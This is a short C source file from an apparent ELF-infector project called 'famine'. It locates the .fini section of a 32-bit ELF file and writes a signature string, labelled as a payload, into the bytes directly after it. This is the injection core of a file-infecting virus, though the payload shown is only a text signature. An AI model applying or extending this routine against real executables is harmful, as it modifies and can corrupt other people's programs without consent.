#include "famine.h"

Elf32_Off find_fini_offset_32(unsigned char *file) {
    Elf32_Ehdr *header32 = (Elf32_Ehdr *)file;
    void *section_table = (Elf32_Shdr *)(file + header32->e_shoff);
    void *section_name = &((Elf32_Shdr *)section_table)[header32->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf32_Shdr *)section_name)->sh_offset);
    int shnum = header32->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf32_Shdr *section = &((Elf32_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_offset;
    }
    return 0;
}

Elf32_Addr find_fini_size_32(unsigned char *file) {
    Elf32_Ehdr *header32 = (Elf32_Ehdr *)file;
    void *section_table = (Elf32_Shdr *)(file + header32->e_shoff);
    void *section_name = &((Elf32_Shdr *)section_table)[header32->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf32_Shdr *)section_name)->sh_offset);
    int shnum = header32->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf32_Shdr *section = &((Elf32_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_size;
    }
    return 0;
}

int handle_32(unsigned char *file) {
    unsigned char payload[] = "Famine version 0.7 (c)oded jul-0032 by bob\n";
    size_t size_payload = strlen((const char *)payload);

    size_t injection_offset = find_fini_offset_32(file) + find_fini_size_32(file);

    memcpy(file + injection_offset, payload, size_payload);

    return 0;
}
